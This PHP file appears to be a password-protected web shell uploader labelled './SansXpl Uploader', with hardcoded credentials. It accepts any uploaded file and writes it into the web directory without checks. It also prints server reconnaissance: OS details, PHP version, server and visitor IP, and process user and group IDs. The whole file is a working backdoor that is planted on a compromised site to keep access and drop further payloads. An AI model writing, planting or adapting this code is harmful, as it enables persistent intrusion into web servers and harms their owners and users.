<?php
$user = "sansxpl";
$pass = "sxpl69";
 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))
 {
  header("WWW-Authenticate: Basic realm=\"Login\"");
  header("HTTP/1.0 401 Unauthorized");
  exit();
 }

echo '
<style>
html {
    background-color: #111;
    color: #BE002A;
}
.cntr {
    flex-direction: column;
    justify-content: center;
    align-items: center;
    display: flex;
    height: 100vh;
  }
</style>
<div class="cntr">
<div class="cntr" style=" height:300px;">
<title>./SansXpl Uploader</title>
<h1><b>./SansXpl Uploader</b></h1>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>
';

$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

$url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$x = pathinfo($url);

if( $_POST['_upl'] == "Upload" )
{

if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
{
    echo '<script>alert("Upload Success!");</script>';
    $upFile = $x['dirname'].'/'.$_FILES['file']['name'];

    $fileUp = '<br>File Url: <a href="'.$upFile.'">'.$upFile.'</a>';

    echo $fileUp;
}
else {
     echo '<script>alert("Upload Failed!");</script>';
    }
}




echo '</div>
<table>
<tbody>
<tr><th colspan="5"><hr></th></tr>
';


echo '<tr><td>Uname: '.php_uname().'</td></tr>';
echo '<tr><td>PHP version: '.PHP_VERSION.'</td></tr>';
echo '<tr><td>Server Ip: '.gethostbyname($_SERVER['HTTP_HOST']).'</td></tr>';
echo '<tr><td>Your Ip: '.getUserIpAddr();
echo '<tr><td>User: '.@get_current_user().' ('.@getmyuid().') | Group: ? ('.@getmygid().')</td></tr>';

echo '<tr><th colspan="5"><hr></th></tr></tbody></table>';

echo '</div>';

function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }elseif(!empty($_SERVER['REMOTE_ADDR'])){

        $ip = $_SERVER['REMOTE_ADDR'];
    }else{
        $ip = "Unknown";
    }
    return $ip;
}
?>